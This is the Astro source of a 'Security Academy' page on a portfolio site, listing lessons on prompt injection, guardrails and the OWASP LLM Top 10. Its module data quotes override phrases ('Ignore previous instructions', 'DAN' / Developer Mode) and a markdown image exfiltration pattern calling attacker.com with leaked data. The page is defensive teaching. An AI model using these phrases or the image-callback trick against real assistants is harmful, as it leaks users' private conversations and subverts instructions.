---
import BaseLayout from '../layouts/BaseLayout.astro';
import FlowExplorer from '../components/FlowExplorer.astro';
import { site } from '../data/site';

const modules = [
  {
    id: 'prompt-injection',
    title: 'Prompt Injection & Jailbreaks',
    level: 'Beginner',
    readTime: '4 min',
    icon: '🛡️',
    summary: 'Understand how adversaries bypass system instructions through direct overrides, roleplay attacks, and delimiter manipulation.',
    keyTakeaway: 'Always isolate untrusted user input using XML/tag delimiters and never trust raw user strings in system prompts.',
    topics: [
      'Direct instruction override ("Ignore previous instructions")',
      'Adversarial persona adoption ("DAN" / Developer Mode)',
      'Delimiter hijacking and escaping',
      'Indirect prompt injection via external data sources',
    ],
  },
  {
    id: 'data-exfiltration',
    title: 'Data Exfiltration & Markdown Embeds',
    level: 'Intermediate',
    readTime: '5 min',
    icon: '🔍',
    summary: 'How attackers trick LLMs into rendering external image tags and tracking pixels to exfiltrate private conversation history or system secrets.',
    keyTakeaway: 'Strictly prohibit arbitrary markdown images (![...](...)) and validate all external URLs in model output.',
    topics: [
      'Markdown image callback exploits (![img](https://attacker.com?leak=...))',
      'Hyperlink masquerading and phishing links',
      'System prompt extraction techniques',
      'Mitigation with strict Content Security Policy (CSP)',
    ],
  },
  {
    id: 'defensive-guardrails',
    title: 'Multi-Tier Guardrails & Output Filtering',
    level: 'Intermediate',
    readTime: '6 min',
    icon: '⚡',
    summary: 'Design defense-in-depth architectures with pre-inference input validation, system prompt hardening, and post-inference output verification.',
    keyTakeaway: 'A single layer is never enough. Use input regex/heuristic filters, hardened system instructions, and streaming output scanners.',
    topics: [
      '8 Critical System Prompt Security Rules',
      'Heuristic & regex-based input guardrails',
      'Streaming TransformStream output filtering in Cloudflare Workers',
      'Deterministic fallback responses on violation detection',
    ],
  },
  {
    id: 'owasp-llm-top-10',
    title: 'OWASP Top 10 for LLM Applications',
    level: 'Advanced',
    readTime: '7 min',
    icon: '🏆',
    summary: 'A curated overview of the industry-standard OWASP Top 10 vulnerabilities in modern AI applications and APIs.',
    keyTakeaway: 'Treat LLMs as untrusted third-party agents; never grant them unchecked write/execute access to databases or shell environments.',
    topics: [
      'LLM01: Prompt Injection',
      'LLM02: Sensitive Information Disclosure',
      'LLM03: Supply Chain Vulnerabilities',
      'LLM06: Excessive Agency and Autonomous Tool Execution',
    ],
  },
];

import { OAUTH_PKCE_FLOW, PROMPT_INJECTION_DEFENSE_FLOW, WEBAUTHN_PASSKEY_FLOW } from '../data/flows';
---

<BaseLayout
  title={`Security Academy - ${site.name}`}
  description="Byte-sized, practical lessons on AI security, prompt injection defense, and application security."
>
  <header class="flex flex-col gap-4 border-b border-[var(--border)] pb-8 md:flex-row md:items-end md:justify-between">
    <div class="max-w-3xl">
      <div class="inline-flex items-center gap-2 rounded-full border border-[var(--border)] bg-[var(--surface)] px-3 py-1 text-xs font-semibold text-[var(--accent)]">
        <span>🔒</span> Security & AI Engineering
      </div>
      <h1 class="mt-4 text-4xl font-bold tracking-tight sm:text-5xl">Security Academy</h1>
      <p class="mt-4 text-lg text-[var(--muted)]">
        Byte-sized, battle-tested lessons on AI AppSec, prompt injection defenses, LLM guardrails, and secure system design.
      </p>
    </div>

    <!-- Quick Action Navigation -->
    <div class="flex flex-wrap items-center gap-3">
      <a
        href="/lab"
        class="inline-flex items-center gap-2 rounded-xl bg-[var(--accent)] px-4 py-2.5 text-xs font-bold text-white shadow-md hover:opacity-90 transition-all active:scale-95"
      >
        <span>⚡</span>
        <span>Hands-on Labs</span>
      </a>
      <a
        href="/academy/exam"
        class="inline-flex items-center gap-2 rounded-xl border border-[var(--border)] bg-[var(--surface)] px-4 py-2.5 text-xs font-bold text-[var(--text)] hover:bg-[var(--surface-muted)] hover:border-[var(--accent)] transition-all"
      >
        <span>🛡️</span>
        <span>Certification Exam</span>
      </a>
    </div>
  </header>

  <!-- Interactive Sequence Diagram Component Showcase -->
  <section class="mt-12">
    <div class="mb-6 flex flex-wrap items-center justify-between gap-4">
      <div>
        <h2 class="text-2xl font-bold text-[var(--text)]">Interactive Flow Explorer</h2>
        <p class="mt-1 text-sm text-[var(--muted)]">
          Step-by-step visual exploration of network and security flows with animated SVG sequence arrows.
        </p>
      </div>
    </div>

    <!-- Interactive Flow Tabs -->
    <div class="flow-tabs-container">
      <div class="flex flex-wrap gap-2 border-b border-[var(--border)] pb-3" role="tablist">
        <button
          type="button"
          class="flow-tab-btn active inline-flex items-center gap-2 rounded-xl border border-[var(--accent)] bg-[var(--accent)]/15 px-4 py-2 text-xs font-bold text-[var(--accent)] transition-all cursor-pointer"
          data-target="flow-oauth"
          role="tab"
          aria-selected="true"
        >
          <span>🔐</span>
          <span>OAuth 2.0 PKCE Flow</span>
        </button>
        <button
          type="button"
          class="flow-tab-btn inline-flex items-center gap-2 rounded-xl border border-[var(--border)] bg-[var(--surface)] px-4 py-2 text-xs font-bold text-[var(--muted)] hover:text-[var(--text)] hover:border-[var(--accent)]/50 transition-all cursor-pointer"
          data-target="flow-prompt-defense"
          role="tab"
          aria-selected="false"
        >
          <span>🛡️</span>
          <span>AI Prompt Injection Edge Defense</span>
        </button>
        <button
          type="button"
          class="flow-tab-btn inline-flex items-center gap-2 rounded-xl border border-[var(--border)] bg-[var(--surface)] px-4 py-2 text-xs font-bold text-[var(--muted)] hover:text-[var(--text)] hover:border-[var(--accent)]/50 transition-all cursor-pointer"
          data-target="flow-webauthn"
          role="tab"
          aria-selected="false"
        >
          <span>🔑</span>
          <span>WebAuthn Passkey Registration</span>
        </button>
      </div>

      <!-- Flow Panels -->
      <div class="mt-4">
        <!-- Flow 1: OAuth 2.0 PKCE -->
        <div id="flow-oauth" class="flow-panel" role="tabpanel">
          <FlowExplorer
            id="oauth-flow"
            title="OAuth 2.0 PKCE Authorization & Token Flow"
            steps={OAUTH_PKCE_FLOW}
            autoPlayInterval={3500}
          />
        </div>

        <!-- Flow 2: Prompt Injection Interception -->
        <div id="flow-prompt-defense" class="flow-panel hidden" role="tabpanel">
          <FlowExplorer
            id="prompt-defense-flow"
            title="Zero-Cost Edge Prompt Guardrail Interception"
            steps={PROMPT_INJECTION_DEFENSE_FLOW}
            autoPlayInterval={3200}
          />
        </div>

        <!-- Flow 3: WebAuthn Passkey Flow -->
        <div id="flow-webauthn" class="flow-panel hidden" role="tabpanel">
          <FlowExplorer
            id="webauthn-flow"
            title="WebAuthn Hardware Passkey Registration Flow"
            steps={WEBAUTHN_PASSKEY_FLOW}
            autoPlayInterval={3200}
          />
        </div>
      </div>
    </div>
  </section>

  <script>
    function setupFlowTabs() {
      const tabBtns = document.querySelectorAll<HTMLButtonElement>('.flow-tab-btn');
      const panels = document.querySelectorAll<HTMLElement>('.flow-panel');

      tabBtns.forEach((btn) => {
        btn.addEventListener('click', () => {
          const targetId = btn.dataset.target;
          if (!targetId) return;

          tabBtns.forEach((b) => {
            b.classList.remove('active', 'border-[var(--accent)]', 'bg-[var(--accent)]/15', 'text-[var(--accent)]');
            b.classList.add('border-[var(--border)]', 'bg-[var(--surface)]', 'text-[var(--muted)]');
            b.setAttribute('aria-selected', 'false');
          });

          btn.classList.add('active', 'border-[var(--accent)]', 'bg-[var(--accent)]/15', 'text-[var(--accent)]');
          btn.classList.remove('border-[var(--border)]', 'bg-[var(--surface)]', 'text-[var(--muted)]');
          btn.setAttribute('aria-selected', 'true');

          panels.forEach((p) => {
            if (p.id === targetId) {
              p.classList.remove('hidden');
            } else {
              p.classList.add('hidden');
            }
          });
        });
      });
    }

    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', setupFlowTabs);
    } else {
      setupFlowTabs();
    }
    document.addEventListener('astro:page-load', setupFlowTabs);
  </script>

  <!-- Interactive Modules Grid -->
  <section class="mt-16 grid gap-6 md:grid-cols-2">
    {modules.map((mod) => (
      <article class="flex flex-col justify-between rounded-xl border border-[var(--border)] bg-[var(--surface)] p-6 transition-all hover:border-[var(--accent)] hover:shadow-lg">
        <div>
          <div class="flex items-center justify-between">
            <span class="text-3xl">{mod.icon}</span>
            <div class="flex items-center gap-2">
              <span class="rounded-full bg-[var(--surface-muted)] px-2.5 py-1 text-xs font-medium text-[var(--muted)]">{mod.readTime}</span>
              <span class="rounded-full bg-[var(--accent)]/10 px-2.5 py-1 text-xs font-semibold text-[var(--accent)]">{mod.level}</span>
            </div>
          </div>

          <h2 class="mt-4 text-xl font-bold text-[var(--text)]">{mod.title}</h2>
          <p class="mt-2 text-sm leading-relaxed text-[var(--muted)]">{mod.summary}</p>

          <div class="mt-4">
            <p class="text-xs font-semibold uppercase tracking-wider text-[var(--accent)]">Key Concepts</p>
            <ul class="mt-2 space-y-1 text-xs text-[var(--muted)]">
              {mod.topics.map((t) => (
                <li class="flex items-start gap-1.5">
                  <span class="text-[var(--accent)]">•</span>
                  <span>{t}</span>
                </li>
              ))}
            </ul>
          </div>
        </div>

        <div class="mt-6 border-t border-[var(--border)] pt-4">
          <div class="rounded-lg bg-[var(--surface-muted)] p-3 text-xs text-[var(--muted)]">
            <strong class="text-[var(--text)]">💡 Rule of Thumb:</strong> {mod.keyTakeaway}
          </div>
        </div>
      </article>
    ))}
  </section>

  <!-- Interactive Security Sandbox / Checklist -->
  <section class="mt-14 rounded-2xl border border-[var(--border)] bg-[var(--surface)] p-6 sm:p-8">
    <div class="max-w-3xl">
      <h2 class="text-2xl font-bold text-[var(--text)]">🎯 AI Security Checklist</h2>
      <p class="mt-2 text-sm text-[var(--muted)]">
        Essential security controls implemented in this portfolio&apos;s production AI assistant:
      </p>

      <div class="mt-6 grid gap-3 sm:grid-cols-2">
        <label class="flex items-center gap-3 rounded-lg border border-[var(--border)] bg-[var(--surface-muted)] p-3 text-sm cursor-pointer">
          <input type="checkbox" checked disabled class="accent-[var(--accent)] h-4 w-4 rounded" />
          <span>Strict XML input tagging (<code class="text-xs font-mono">&lt;user_input&gt;</code>)</span>
        </label>
        <label class="flex items-center gap-3 rounded-lg border border-[var(--border)] bg-[var(--surface-muted)] p-3 text-sm cursor-pointer">
          <input type="checkbox" checked disabled class="accent-[var(--accent)] h-4 w-4 rounded" />
          <span>8 Core System Prompt Constraints</span>
        </label>
        <label class="flex items-center gap-3 rounded-lg border border-[var(--border)] bg-[var(--surface-muted)] p-3 text-sm cursor-pointer">
          <input type="checkbox" checked disabled class="accent-[var(--accent)] h-4 w-4 rounded" />
          <span>Pre-inference Prompt Injection Scanner</span>
        </label>
        <label class="flex items-center gap-3 rounded-lg border border-[var(--border)] bg-[var(--surface-muted)] p-3 text-sm cursor-pointer">
          <input type="checkbox" checked disabled class="accent-[var(--accent)] h-4 w-4 rounded" />
          <span>Streaming SSE Output Leak Redaction</span>
        </label>
      </div>

      <div class="mt-6 flex flex-wrap items-center gap-4">
        <a
          href="/verify"
          class="inline-flex items-center justify-center gap-2 rounded-lg bg-[var(--accent)] px-5 py-2.5 text-sm font-semibold text-white shadow-sm hover:opacity-90 transition-all active:scale-95"
        >
          <span>📜</span>
          <span>Verify Issued Certificate</span>
        </a>
        <a
          href="/contact"
          class="inline-flex items-center justify-center rounded-lg border border-[var(--border)] bg-[var(--surface)] px-5 py-2.5 text-sm font-semibold text-[var(--text)] hover:bg-[var(--surface-muted)]"
        >
          Discuss AI Security Collaboration &rarr;
        </a>
      </div>
    </div>
  </section>
</BaseLayout>
